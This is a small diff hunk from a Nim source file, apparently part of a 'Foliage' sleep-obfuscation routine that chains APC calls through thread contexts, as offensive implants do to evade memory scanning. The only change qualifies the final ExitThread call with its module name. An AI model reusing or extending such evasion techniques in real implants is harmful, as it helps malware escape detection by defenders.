@@ -548,7 +548,7 @@ proc sleepFoliage(apis: Apis, key, img: USTRING, sleepDelay: int) =
         inc gadget
         
         # ctx[6] contains the final call, which exits the created thread after all APC calls have been executed.
-        ctx[gadget].Rip = cast[DWORD64](ExitThread)
+        ctx[gadget].Rip = cast[DWORD64](winbase.ExitThread)
         ctx[gadget].Rcx = cast[DWORD64](0)
 
         # Queueing the chain 
